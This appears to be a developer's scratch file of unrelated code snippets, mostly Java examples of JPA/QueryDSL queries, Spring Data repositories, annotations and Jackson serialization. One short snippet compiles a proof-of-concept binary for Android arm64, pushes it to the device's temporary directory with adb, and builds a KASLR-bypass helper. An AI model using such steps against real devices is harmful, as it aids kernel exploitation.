final JPAQueryFactory queryFactory = new JPAQueryFactory(HQLTemplates.DEFAULT, this.getEntityManager());
final QFileEntity file = QFileEntity.fileEntity;
final QVersionEntity version = QVersionEntity.versionEntity;
final QLocaleVersionEntity localeVersion = QLocaleVersionEntity.localeVersionEntity;
final FileEntity fileEntity = queryFactory
        .selectFrom(file).innerJoin(file.version, version).innerJoin(file.version.locales, localeVersion)
        .where(file.version.product.sku.eq("sku-333d497a"))
        .fetchOne();
		

from(user).innerJoin(user.groups, group)
  .where(user.id.eq(userId))
  .list(group);
  
        final JPAQueryFactory queryFactory = new JPAQueryFactory(HQLTemplates.DEFAULT, this.getEntityManager());
        final QFileEntity user = QFileEntity.fileEntity;
        final FileEntity c = queryFactory
                .selectFrom(user)
                .where(user.version().locales.contains(new LocaleInfoEntity(searchParameters.getLocale())))
                .fetchOne();

        final BooleanExpression searchPredicate = QFileEntity.fileEntity.version().product().sku.equalsIgnoreCase(searchParameters.getSku())
                .and(QFileEntity.fileEntity.fileInfo().filePlatform.equalsIgnoreCase(searchParameters.getPlatform()))
                .and(QFileEntity.fileEntity.version().locales.contains(new LocaleInfoEntity(searchParameters.getLocale())));
        if (StringUtils.isBlank(searchParameters.getVersion())) {
            for (int i = 0; i < 4; i++) {
//                searchPredicate
//                        .and(QFileEntity.fileEntity.version().versionInfo().tokens.get(i).eq(QFileEntity.fileEntity.version().versionInfo().tokens.get(i).max()));
            }
            return searchPredicate;
        }
        final VersionInfoEntity versionInfoEntity = this.buildVersionInfo(searchParameters.getVersion());
        return searchPredicate.and(QFileEntity.fileEntity.version().versionInfo().eq(versionInfoEntity));
    }

    /**
     * Returns {@link VersionInfoEntity} by input {@link String} version
     *
     * @param version - initial input {@link String} version
     * @return {@link VersionInfoEntity}
     */
    private VersionInfoEntity buildVersionInfo(final String version) {
        try {
            return this.versionInfoFormatter.parse(version, Locale.getDefault());
        } catch (ParseException e) {
            throw throwInvalidFormat(this.getMessageSource(), ERROR_VERSION_FORMAT_INVALID_MESSAGE_TEMPLATE, version);
        }
    }

    @Override
    protected FileRepository getRepository() {
        return this.fileRepository;
    }
}
-------------------------------------------------------------------------------------------------------
public enum TestType {
    UNIT, INTEGRATION, ACCEPTANCE;
}
@Retention(RUNTIME)
@Target(TYPE)
public @interface Test {
    public TestType value();
}
@Retention(RUNTIME)
@Target(TYPE)
public @interface SlowTest {}
-------------------------------------------------------------------------------------------------------
public class Application {
    public static void main(String[] args) throws Exception {
        AnnotationProcessor processor = new AnnotationProcessor();
        processor.registerHandler(IntegrationTest.class, a -> System.out.println("Found a class annotated with @IntegrationTest"));
        processor.registerHandler(SlowTest.class, a -> System.out.println("Found a class annotated with @SlowTest"));
        processor.registerHandler(Test.class, a -> System.out.println("Found a class annotated with @Test(" + a.value() + ")"));
        processor.process(SomeIntegrationTest.class);
    }
}

In particular, Lombok includes the following contents in its META-INF/services/javax.annotation.processing.Processor file:

lombok.launch.AnnotationProcessorHider$AnnotationProcessor
lombok.launch.AnnotationProcessorHider$ClaimingProcessor


@SuppressWarnings("deprecation")
public @interface SuppressWarningsDeprecation
public enum SupressWarrningsType {
    Deprecation // And others
}
@SupressWarnings(SupressWarrningsType.Deprecation)

@SuppressWarnings("auxiliaryclass")
public annotation class SuppressWarningsAuxilliaryClass

@SuppressWarnings("cast")
public annotation class SuppressWarningsCast

@SuppressWarnings("classfile")
public annotation class SuppressWarningsClassFile

@SuppressWarnings("dep-ann")
public annotation class SuppressWarningsDepAnn

@SuppressWarnings("deprecation")
public annotation class SuppressWarningsDeprecation

@SuppressWarnings("divzero")
public annotation class SuppressWarningsDivZero

@SuppressWarnings("empty")
public annotation class SuppressWarningsEmpty

@SuppressWarnings("fallthrough")
public annotation class SuppressWarningsFallthrough

@SuppressWarnings("finally")
public annotation class SuppressWarningsFinally

@SuppressWarnings("options")
public annotation class SuppressWarningsOptions

@SuppressWarnings("overloads")
public annotation class SuppressWarningsOverloads

@SuppressWarnings("overrides")
public annotation class SuppressWarningsOverrides

@SuppressWarnings("path")
public annotation class SuppressWarningsPath

@SuppressWarnings("processing")
public annotation class SuppressWarningsProcessing

@SuppressWarnings("rawtypes")
public annotation class SuppressWarningsRawTypes

@SuppressWarnings("serial")
public annotation class SuppressWarningsSerial

@SuppressWarnings("static")
public annotation class SuppressWarningsStatic

@SuppressWarnings("try")
public annotation class SuppressWarningsTry

@SuppressWarnings("unchecked")
public annotation class SuppressWarningsUnchecked

@SuppressWarnings("varargs")
public annotation class SuppressWarningsVarargs

@SuppressWarningsAuxilliaryClass
@SuppressWarningsCast
@SuppressWarningsClassFile
@SuppressWarningsDepAnn
@SuppressWarningsDeprecation
@SuppressWarningsDivZero
@SuppressWarningsEmpty
@SuppressWarningsFallthrough
@SuppressWarningsFinally
@SuppressWarningsOptions
@SuppressWarningsOverloads
@SuppressWarningsOverrides
@SuppressWarningsPath
@SuppressWarningsProcessing
@SuppressWarningsRawTypes
@SuppressWarningsSerial
@SuppressWarningsStatic
@SuppressWarningsTry
@SuppressWarningsUnchecked
@SuppressWarningsVarargs
public annotation class SuppressWarningsAll

<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>ch.frankel</groupId>
    <artifactId>safe-annotations</artifactId>
    <version>1.0.1-SNAPSHOT</version>
    <developers>
        <developer>
            <name>Nicolas Fränkel</name>
            <email>nicolas@frankel.ch</email>
        </developer>
    </developers>
    <properties>
        <kotlin.version>1.0.3</kotlin.version>
    </properties>
    <build>
        <sourceDirectory>src/main/kotlin</sourceDirectory>
        <testSourceDirectory>src/test/kotlin</testSourceDirectory>
        <plugins>
            <plugin>
                <artifactId>kotlin-maven-plugin</artifactId>
                <groupId>org.jetbrains.kotlin</groupId>
                <version>${kotlin.version}</version>
                <executions>
                    <execution>
                        <id>compile</id>
                        <phase>compile</phase>
                        <goals>
                            <goal>compile</goal>
                        </goals>
                    </execution>
                    <execution>
                        <id>test-compile</id>
                        <phase>test-compile</phase>
                        <goals>
                            <goal>test-compile</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>
    <scm>
        <connection>scm:git:https://github.com/nfrankel/safe-annotations.git</connection>
        <developerConnection>scm:git:git@github.com:nfrankel/safe-annotations.git</developerConnection>
        <url>https://github.com/nfrankel/safe-annotations.git</url>
        <tag>HEAD</tag>
    </scm>
    <distributionManagement>
        <repository>
            <id>bintray-nfrankel-maven</id>
            <url>https://api.bintray.com/maven/nfrankel/maven/safe-annotations;publish=1</url>
        </repository>
    </distributionManagement>
</project>
-------------------------------------------------------------------------------------------------------
using Newtonsoft.Json;
using System;
using System.CodeDom.Compiler;
using System.Collections.ObjectModel;
using System.ComponentModel.DataAnnotations;

namespace Paragon.Microservices.Coupons.Client.Contracts
{
  [GeneratedCode("NJsonSchema", "9.13.28.0 (Newtonsoft.Json v11.0.0.0)")]
  public class CouponDto
  {
    [JsonProperty("SerialNumber", NullValueHandling = NullValueHandling.Ignore, Required = Required.Default)]
    public string SerialNumber { get; set; }

    [JsonProperty("SKUs", NullValueHandling = NullValueHandling.Ignore, Required = Required.Default)]
    public Collection<string> SKUs { get; set; }

    [JsonProperty("CreationTime", Required = Required.Always)]
    [Required(AllowEmptyStrings = true)]
    public DateTime CreationTime { get; set; }

    [JsonProperty("ModificationTime", Required = Required.Always)]
    [Required(AllowEmptyStrings = true)]
    public DateTime ModificationTime { get; set; }

    [JsonProperty("ExpirationTime", Required = Required.Always)]
    [Required(AllowEmptyStrings = true)]
    public DateTime ExpirationTime { get; set; }

    [JsonProperty("RedemptionTime", NullValueHandling = NullValueHandling.Ignore, Required = Required.Default)]
    public DateTime? RedemptionTime { get; set; }

    [JsonProperty("Type", Required = Required.Always)]
    public int Type { get; set; }

    public string ToJson()
    {
      return JsonConvert.SerializeObject((object) this);
    }

    public static CouponDto FromJson(string data)
    {
      return JsonConvert.DeserializeObject<CouponDto>(data);
    }
  }
}
-------------------------------------------------------------------------------------------------------
{
  "version": 3,
  "nodes": [
    {
      "modifiedLocally": true,
      "type": "Request",
      "method": {
        "requestBody": true,
        "link": "http://tools.ietf.org/html/rfc7231#section-4.3.3",
        "name": "POST"
      },
      "body": {
        "formBody": {
          "overrideContentType": true,
          "encoding": "application/x-www-form-urlencoded",
          "items": []
        },
        "bodyType": "Text",
        "autoSetLength": true,
        "textBodyEditorHeight": 232,
        "textBody": "{\n  \"callbackTopicName\": \"test-topic\",\n  \"callbackMessageType\": \"test-type\",\n  \"details\": {\"key\": \"key\", \"value\": \"value\"}\n}"
      },
      "headersType": "Form",
      "uri": {
        "query": {
          "delimiter": "&",
          "items": []
        },
        "scheme": {
          "name": "http",
          "version": "V11"
        },
        "host": "localhost:8077",
        "path": "/api/internal/links/tickets"
      },
      "id": "543ca52f-253f-407e-b34a-04e075cb66ce",
      "lastModified": "2019-08-19T19:11:42.961+03:00",
      "name": "test",
      "headers": [
        {
          "name": "x-tenant-id",
          "value": "00000000-0000-0000-0000-000000000001"
        },
        {
          "enabled": true,
          "name": "Content-Type",
          "value": "application/json"
        }
      ],
      "assertions": [
        {
          "comparison": "Exists",
          "subject": "ResponseBody",
          "path": "content",
          "value": ""
        }
      ],
      "metaInfo": {
        "IS_FROM_HISTORY": null
      },
      "parent": null,
      "parentId": ""
    }
  ]
}
-------------------------------------------------------------------------------------------------------
List<@Email String> emails;

@Email(payload = Unwrapping.Unwrap.class)
List<String> emails;
-------------------------------------------------------------------------------------------------------
	/**
	 * Enumeration for sort directions.
	 *
	 * @author Oliver Gierke
	 */
	public static enum Direction {

		ASC, DESC;

		/**
		 * Returns whether the direction is ascending.
		 *
		 * @return
		 * @since 1.13
		 */
		public boolean isAscending() {
			return this.equals(ASC);
		}

		/**
		 * Returns whether the direction is descending.
		 *
		 * @return
		 * @since 1.13
		 */
		public boolean isDescending() {
			return this.equals(DESC);
		}

		/**
		 * Returns the {@link Direction} enum for the given {@link String} value.
		 *
		 * @param value
		 * @throws IllegalArgumentException in case the given value cannot be parsed into an enum value.
		 * @return
		 */
		public static Direction fromString(String value) {

			try {
				return Direction.valueOf(value.toUpperCase(Locale.US));
			} catch (Exception e) {
				throw new IllegalArgumentException(String.format(
						"Invalid value '%s' for orders given! Has to be either 'desc' or 'asc' (case insensitive).", value), e);
			}
		}

		/**
		 * Returns the {@link Direction} enum for the given {@link String} or null if it cannot be parsed into an enum
		 * value.
		 *
		 * @param value
		 * @return
		 */
		public static Optional<Direction> fromOptionalString(String value) {

			try {
				return Optional.of(fromString(value));
			} catch (IllegalArgumentException e) {
				return Optional.empty();
			}
		}
	}
-------------------------------------------------------------------------------------------------------
import org.baeldung.caching.model.User;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.data.domain.Sort;
import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.Modifying;
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Repository;

import java.util.Collection;
import java.util.List;
import java.util.Optional;
import java.util.concurrent.CompletableFuture;
import java.util.stream.Stream;

@Repository("userRepository")
public interface UserRepository extends JpaRepository<User, Integer> {

    int countByStatus(int status);

    Optional<User> findOneByName(String name);

    @Async
    CompletableFuture<User> findOneByStatus(Integer status);

    @Query("SELECT u FROM User u WHERE u.status = 1")
    Collection<User> findAllActiveUsers();

    @Query(value = "SELECT * FROM USERS u WHERE u.status = 1", nativeQuery = true)
    Collection<User> findAllActiveUsersNative();

    @Query("SELECT u FROM User u WHERE u.status = ?1")
    User findUserByStatus(Integer status);

    @Query(value = "SELECT * FROM Users u WHERE u.status = ?1", nativeQuery = true)
    User findUserByStatusNative(Integer status);

    @Query("SELECT u FROM User u WHERE u.status = ?1 and u.name = ?2")
    User findUserByStatusAndName(Integer status, String name);

    @Query("SELECT u FROM User u WHERE u.status = :status and u.name = :name")
    User findUserByStatusAndNameNamedParams(@Param("status") Integer status, @Param("name") String name);

    @Query(value = "SELECT * FROM Users u WHERE u.status = :status AND u.name = :name", nativeQuery = true)
    User findUserByStatusAndNameNamedParamsNative(@Param("status") Integer status, @Param("name") String name);

    @Query("SELECT u FROM User u WHERE u.status = :status and u.name = :name")
    User findUserByUserStatusAndUserName(@Param("status") Integer userStatus, @Param("name") String userName);

    @Query("SELECT u FROM User u WHERE u.name like ?1%")
    User findUserByNameLike(String name);

    @Query("SELECT u FROM User u WHERE u.name like :name%")
    User findUserByNameLikeNamedParam(@Param("name") String name);

    @Query(value = "SELECT * FROM users u WHERE u.name LIKE ?1%", nativeQuery = true)
    User findUserByNameLikeNative(String name);

    @Query(value = "SELECT u FROM User u")
    List<User> findAllUsers(Sort sort);

    @Query(value = "SELECT u FROM User u ORDER BY id")
    Page<User> findAllUsersWithPagination(Pageable pageable);

    @Query(value = "SELECT * FROM Users ORDER BY id \n-- #pageable\n", countQuery = "SELECT count(*) FROM Users", nativeQuery = true)
    Page<User> findAllUsersWithPaginationNative(Pageable pageable);

    @Modifying
    @Query("update User u set u.status = :status where u.name = :name")
    int updateUserSetStatusForName(@Param("status") Integer status, @Param("name") String name);

    @Modifying
    @Query(value = "UPDATE Users u SET u.status = ? WHERE u.name = ?", nativeQuery = true)
    int updateUserSetStatusForNameNative(Integer status, String name);

}
-------------------------------------------------------------------------------------------------------
./toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android29-clang -o poc ../poc.c
adb push poc /data/local/tmp/poc
gcc -o fix_kaslr_arm64 fix_kaslr_arm64.c
-------------------------------------------------------------------------------------------------------
choco install nswagstudio
-------------------------------------------------------------------------------------------------------
//@Configuration
//public class JacksonConfig {
//    @Bean
//    public ObjectMapper jsonObjectMapper() {
//        ArrayList<Module> modules = new ArrayList<>();
//
//        //CollectionType Serialization
//        SimpleModule collectionTypeSerializerModule = new SimpleModule();
//        collectionTypeSerializerModule.setSerializers(new CollectionTypeJsonSerializer());
//        modules.add(collectionTypeSerializerModule);
//
//        return Jackson2ObjectMapperBuilder.json()
//                .modules(modules)
//                .build();
//    }
//}
-------------------------------------------------------------------------------------------------------
//public class CollectionTypeJsonSerializer extends SimpleSerializers {
//
//    @Override
//    public JsonSerializer<?> findCollectionSerializer(SerializationConfig config,
//                                                      CollectionType type,
//                                                      BeanDescription beanDesc,
//                                                      TypeSerializer elementTypeSerializer,
//                                                      JsonSerializer<Object> elementValueSerializer) {
//        //if the collection is of type LanguageString, then use custom collection serializer
//        if (isLanguageStringListType(type)) {
//            return new LanguageStringListSerializer();
//        }
//
//        return findSerializer(config, type, beanDesc);
//    }
//
//
//    private boolean isLanguageStringListType(CollectionType type) {
//        CollectionType languageStringArrayListType = TypeFactory.defaultInstance()
//            .constructCollectionType(ArrayList.class, LanguageString.class);
//
//        CollectionType languageStringListType = TypeFactory.defaultInstance()
//            .constructCollectionType(List.class, LanguageString.class);
//
//        return (type.equals(languageStringListType) || type.equals(languageStringArrayListType));
//    }
//}
//
///*
//@Configuration
//public class JacksonConfig {
//    @Bean
//    public ObjectMapper jsonObjectMapper() {
//        ArrayList<Module> modules = new ArrayList<>();
//
//        //CollectionType Serialization
//        SimpleModule collectionTypeSerializerModule = new SimpleModule();
//        collectionTypeSerializerModule.setSerializers(new CollectionTypeJsonSerializer());
//        modules.add(collectionTypeSerializerModule);
//
//        return Jackson2ObjectMapperBuilder.json()
//                .modules(modules)
//                .build();
//    }
//}
// */
-------------------------------------------------------------------------------------------------------
public final class ClassKey
    implements Comparable<ClassKey>,
        java.io.Serializable // since 2.1
{
    private static final long serialVersionUID = 1L;

    private String _className;

    private Class<?> _class;

    /**
     * Let's cache hash code straight away, since we are
     * almost certain to need it.
     */
    private int _hashCode;

    public ClassKey() 
    {
        _class = null;
        _className = null;
        _hashCode = 0;
    }

    public ClassKey(Class<?> clz)
    {
        _class = clz;
        _className = clz.getName();
        _hashCode = _className.hashCode();
    }

    public void reset(Class<?> clz)
    {
        _class = clz;
        _className = clz.getName();
        _hashCode = _className.hashCode();
    }

    /*
    /**********************************************************
    /* Comparable
    /**********************************************************
     */

    @Override
    public int compareTo(ClassKey other)
    {
        // Just need to sort by name, ok to collide (unless used in TreeMap/Set!)
        return _className.compareTo(other._className);
    }

    /*
    /**********************************************************
    /* Standard methods
    /**********************************************************
     */

    @Override
        public boolean equals(Object o)
    {
        if (o == this) return true;
        if (o == null) return false;
        if (o.getClass() != getClass()) return false;
        ClassKey other = (ClassKey) o;

        /* Is it possible to have different Class object for same name + class loader combo?
         * Let's assume answer is no: if this is wrong, will need to uncomment following functionality
         */
        /*
        return (other._className.equals(_className))
            && (other._class.getClassLoader() == _class.getClassLoader());
        */
        return other._class == _class;
    }

    @Override public int hashCode() { return _hashCode; }

    @Override public String toString() { return _className; }
}
-------------------------------------------------------------------------------------------------------
ObjectMapper objectMapper = new ObjectMapper();
Car car = new Car("yellow", "renault");
objectMapper.writeValue(new File("target/car.json"), car);

objectMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
Car car = objectMapper.readValue(jsonString, Car.class);
 
JsonNode jsonNodeRoot = objectMapper.readTree(jsonString);
JsonNode jsonNodeYear = jsonNodeRoot.get("year");
String year = jsonNodeYear.asText();
-------------------------------------------------------------------------------------------------------
ObjectMapper objectMapper = new ObjectMapper();
DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm a z");
objectMapper.setDateFormat(df);
String carAsString = objectMapper.writeValueAsString(request);
// output: {"car":{"color":"yellow","type":"renault"},"datePurchased":"2016-07-03 11:43 AM CEST"}

String jsonCarArray = 
  "[{ \"color\" : \"Black\", \"type\" : \"BMW\" }, { \"color\" : \"Red\", \"type\" : \"FIAT\" }]";
ObjectMapper objectMapper = new ObjectMapper();
objectMapper.configure(DeserializationFeature.USE_JAVA_ARRAY_FOR_JSON_ARRAY, true);
Car[] cars = objectMapper.readValue(jsonCarArray, Car[].class);
// print cars

String jsonCarArray = 
  "[{ \"color\" : \"Black\", \"type\" : \"BMW\" }, { \"color\" : \"Red\", \"type\" : \"FIAT\" }]";
ObjectMapper objectMapper = new ObjectMapper();
List<Car> listCar = objectMapper.readValue(jsonCarArray, new TypeReference<List<Car>>(){});
// print cars
-------------------------------------------------------------------------------------------------------
//package visibility, to allow passing different De/Serializers while testing
static ObjectMapper createObjectMapper(JsonDeserializer deserializer, JsonSerializer serializer) {
    final SimpleModule module = new SimpleModule("customerSerializationModule", new Version(1, 0, 0, "static version"));
    module.addDeserializer(DateTime.class, deserializer);
    module.addSerializer(DateTime.class, serializer);

    final ObjectMapper objectMapper = new ObjectMapper();
    objectMapper.registerModule(module);
    return objectMapper;
}

//production method: no-args, as in the original version
public static ObjectMapper createObjectMapper() {
    return createObjectMapper(new DateTimeDeserializer(), new DateTimeSerializer());
}
-------------------------------------------------------------------------------------------------------
@JsonRootName(value = "user")
class User {

    @JsonProperty(value = "id")
    private long id;
    @JsonProperty(value = "diets")
    @JsonDeserialize(using = DietDeserializer.class)
    private List<Diet> diets;

    //Getter & Setters
}

class DietDeserializer extends JsonDeserializer<List<Diet>> {

    @Override
    public List<Diet> deserialize(JsonParser jsonParser, 
            DeserializationContext deserializationContext) throws IOException {

        ObjectMapper mapper = new ObjectMapper();
        JsonNode node = mapper.readTree(jsonParser);
        List<Diet> diets = mapper.convertValue(node.findValues("diet"), new TypeReference<List<Diet>>() {});
        return diets;
    }
}
-------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.codehaus.jackson.JsonGenerationException;
import org.codehaus.jackson.map.JsonMappingException;
import org.codehaus.jackson.map.ObjectMapper;
import org.codehaus.jackson.map.SerializationConfig;

public class JacksonExample {
	public static void main(String[] args) {

		ObjectMapper mapper = new ObjectMapper();
		//By default all fields without explicit view definition are included, disable this
		mapper.configure(SerializationConfig.Feature.DEFAULT_VIEW_INCLUSION, false);
		 
		//For testing
		User user = createDummyUser();
		
		try {
			//display name only
			String jsonInString = mapper.writerWithView(Views.NameOnly.class).writeValueAsString(user);
			System.out.println(jsonInString);
			
			//display namd ana age
			jsonInString = mapper.writerWithView(Views.AgeAndName.class).writeValueAsString(user);
			System.out.println(jsonInString);
			
			
		} catch (JsonGenerationException e) {
			e.printStackTrace();
		} catch (JsonMappingException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	
	}

	private static User createDummyUser(){
		
		User user = new User();
		
		user.setName("mkyong");
		user.setAge(33);

		List<String> msg = new ArrayList<>();
		msg.add("hello jackson 1");
		msg.add("hello jackson 2");
		msg.add("hello jackson 3");

		user.setMessages(msg);
		
		return user;
		
	}
}


import java.util.List;
import org.codehaus.jackson.map.annotate.JsonView;

public class User {

	@JsonView(Views.NameOnly.class)
	private String name;

	@JsonView(Views.AgeAndName.class)
	private int age;
	
	private List<String> messages;

	//getter and setters
}


import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.fasterxml.jackson.databind.ser.std.StdSerializer;

import java.io.IOException;

public class CarSerializer extends StdSerializer<Car> {

    protected CarSerializer(Class<Car> t) {
        super(t);
    }

    public void serialize(Car car, JsonGenerator jsonGenerator,
                          SerializerProvider serializerProvider)
            throws IOException {

        jsonGenerator.writeStartObject();
        jsonGenerator.writeStringField("producer", car.getBrand());
        jsonGenerator.writeNumberField("doorCount", car.getDoors());
        jsonGenerator.writeEndObject();
    }
}
-------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.dataformat.cbor.CBORFactory;

import java.io.IOException;

public class CborJacksonExample {
    public static void main(String[] args) {
        ObjectMapper objectMapper = new ObjectMapper(new CBORFactory());

        Employee employee = new Employee("John Doe", "john@doe.com");

        byte[] cborBytes = null;
        try {
            cborBytes = objectMapper.writeValueAsBytes(employee);
        } catch (JsonProcessingException e) {
            e.printStackTrace();
            // normally, rethrow exception here - or don't catch it at all.
        }

        try {
            Employee employee2 = objectMapper.readValue(cborBytes, Employee.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.msgpack.jackson.dataformat.MessagePackFactory;

import java.io.IOException;

public class MessagePackJacksonExample {
    public static void main(String[] args) {
        ObjectMapper objectMapper = new ObjectMapper(new MessagePackFactory());

        Employee employee = new Employee("John Doe", "john@doe.com");

        byte[] messagePackBytes = null;
        try {
            messagePackBytes = objectMapper.writeValueAsBytes(employee);
        } catch (JsonProcessingException e) {
            e.printStackTrace();
            // normally, rethrow exception here - or don't catch it at all.
        }
    }
}

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.msgpack.jackson.dataformat.MessagePackFactory;

import java.io.IOException;

public class MessagePackJacksonExample {
    public static void main(String[] args) {
        ObjectMapper objectMapper = new ObjectMapper(new MessagePackFactory());

        Employee employee = new Employee("John Doe", "john@doe.com");

        byte[] messagePackBytes = null;
        try {
            messagePackBytes = objectMapper.writeValueAsBytes(employee);
        } catch (JsonProcessingException e) {
            e.printStackTrace();
            // normally, rethrow exception here - or don't catch it at all.
        }

        try {
            Employee employee2 = objectMapper.readValue(messagePackBytes, Employee.class);
            System.out.println("messagePackBytes = " + messagePackBytes);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.dataformat.yaml.YAMLFactory;

import java.io.IOException;

public class YamlJacksonExample {

    public static void main(String[] args) {
        ObjectMapper objectMapper = new ObjectMapper(new YAMLFactory());

        Employee employee = new Employee("John Doe", "john@doe.com");

        String yamlString = null;
        try {
            yamlString = objectMapper.writeValueAsString(employee);
        } catch (JsonProcessingException e) {
            e.printStackTrace();
            // normally, rethrow exception here - or don't catch it at all.
        }

    }
}

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.dataformat.yaml.YAMLFactory;

import java.io.IOException;

public class YamlJacksonExample {

    public static void main(String[] args) {
        ObjectMapper objectMapper = new ObjectMapper(new YAMLFactory());

        Employee employee = new Employee("John Doe", "john@doe.com");

        String yamlString = null;
        try {
            yamlString = objectMapper.writeValueAsString(employee);
        } catch (JsonProcessingException e) {
            e.printStackTrace();
            // normally, rethrow exception here - or don't catch it at all.
        }

        try {
            Employee employee2 = objectMapper.readValue(yamlString, Employee.class);

            System.out.println("Done");
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}



  public static CodecRegistry registryFromMapper(final ObjectMapper mapper) {
    Preconditions.checkNotNull(mapper, "mapper");
    return new CodecRegistry() {
      @Override
      public <T> Codec<T> get(final Class<T> clazz) {
        final JavaType javaType = TypeFactory.defaultInstance().constructType(clazz);
        if (!mapper.canSerialize(clazz) || !mapper.canDeserialize(javaType)) {
          throw new CodecConfigurationException(String.format("%s (javaType: %s) not supported by Jackson Mapper", clazz, javaType));
        }
        return new JacksonCodec<>(clazz, mapper);
      }
    };
  }
-------------------------------------------------------------------------------------------------------
TypeFactory.defaultInstance().constructType(type)
-------------------------------------------------------------------------------------------------------
x = new EnumMap<Value, Integer>(Value.class);
HashMap<String, Object> yourHashMap = new Gson().fromJson(yourJsonObject.toString(), HashMap.class)
-------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.core.JsonParser;

import com.fasterxml.jackson.core.JsonProcessingException;

import com.fasterxml.jackson.core.ObjectCodec;

import com.fasterxml.jackson.databind.DeserializationContext;

import com.fasterxml.jackson.databind.JsonDeserializer;

import com.fasterxml.jackson.databind.JsonNode;

import java.io.IOException;

public class ProgramDeserializer extends JsonDeserializer<Program> {

  @Override

  public Program deserialize(JsonParser jp, DeserializationContext ctxt) throws IOException, JsonProcessingException {

    ObjectCodec oc = jp.getCodec();

    JsonNode node = oc.readTree(jp);

    final Long id = node.get("id").asLong();

    final String name = node.get("name").asText();

    final String contents = node.get("contents").asText();

    final long ownerId = node.get("ownerId").asLong();

    User user = new User();

    user.setId(ownerId);

    return new Program(id, name, contents, user);
  }
}
-------------------------------------------------------------------------------------------------------
private static final Pattern ISO8601_UTC_ZERO_OFFSET_SUFFIX_REGEX = Pattern.compile("\\+00:?(00)?$");
-------------------------------------------------------------------------------------------------------
  @Bean("defaultAxonObjectMapper")
  @ConditionalOnMissingBean
  @ConditionalOnExpression("'${axon.serializer.general}' == 'jackson' || '${axon.serializer.events}' == 'jackson' || '${axon.serializer.messages}' == 'jackson'")
  public ObjectMapper defaultAxonObjectMapper() {
    return new ObjectMapper().findAndRegisterModules();
  }
}
-------------------------------------------------------------------------------------------------------
    @Entity
    @Table(name= "topics")
    @JsonIdentityInfo(generator = ObjectIdGenerators.PropertyGenerator.class,
    property  = "id",
    scope     = Long.class)
    @DynamicInsert(true)
    @DynamicUpdate(true)
    public class Topics implements Serializable {

        private static final long serialVersionUID = -1777454701749518940L;

        @Id
        @Column(name= "id")
        private Long id = Long.parseLong(UUID.randomUUID().toString().substring(0, 8), 16);

        @NotEmpty
        @NotNull
        @Column(name= "topic", columnDefinition = "Text", length = 50000)
        private String topic;

        @Convert(converter = LocalTimeConverter.class)
        private LocalTime duration;

        // getters and setters
     }
-------------------------------------------------------------------------------------------------------
ObjectMapper objectMapper = new ObjectMapper();
objectMapper.findAndRegisterModules();

<dependency>
    <groupId>com.fasterxml.jackson.datatype</groupId>
    <artifactId>jackson-datatype-jsr310</artifactId>
    <version>2.6.5</version>
</dependency>

@JsonDeserialize(using = MyCustomDeserializer.class)
@JsonSerialize(using = MyCustomSerializer.class)
private Instant createdDate;

final ObjectReader r = objectMapper.reader(MyType.class);
// enable one feature, disable another
MyType value = r
  .with(DeserializationFeature.USE_BIG_DECIMAL_FOR_FLOATS)
  .without(DeserializationFeature.WRAP_EXCEPTIONS)
  .readValue(source);
-------------------------------------------------------------------------------------------------------
    public static Map<String, Object> toMap(JSONObject jsonobj)  throws JSONException {
        Map<String, Object> map = new HashMap<String, Object>();
        Iterator<String> keys = jsonobj.keys();
        while(keys.hasNext()) {
            String key = keys.next();
            Object value = jsonobj.get(key);
            if (value instanceof JSONArray) {
                value = toList((JSONArray) value);
            } else if (value instanceof JSONObject) {
                value = toMap((JSONObject) value);
            }   
            map.put(key, value);
        }   return map;
    }

    public static List<Object> toList(JSONArray array) throws JSONException {
        List<Object> list = new ArrayList<Object>();
        for(int i = 0; i < array.length(); i++) {
            Object value = array.get(i);
            if (value instanceof JSONArray) {
                value = toList((JSONArray) value);
            }
            else if (value instanceof JSONObject) {
                value = toMap((JSONObject) value);
            }
            list.add(value);
        }   return list;
}
-------------------------------------------------------------------------------------------------------
ObjectMapper mapper = new ObjectMapper();
mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
try {
    List<Vehicle> vehicles = mapper.readValue(JSONString, mapper.getTypeFactory().constructCollectionType(
            List.class, Vehicle.class));
} catch (IOException e) {
    e.printStackTrace();
}

@JsonTypeInfo(
        use = JsonTypeInfo.Id.NAME,
        include = JsonTypeInfo.As.PROPERTY,
        property = "type")
@JsonSubTypes({
        @JsonSubTypes.Type(value = Car.class, name = "Car"),
        @JsonSubTypes.Type(value = Bus.class, name = "Bus"),
        @JsonSubTypes.Type(value = Truck.class, name = "Truck")})
public abstract class Vehicle{
    private int id;
    private String type;
}
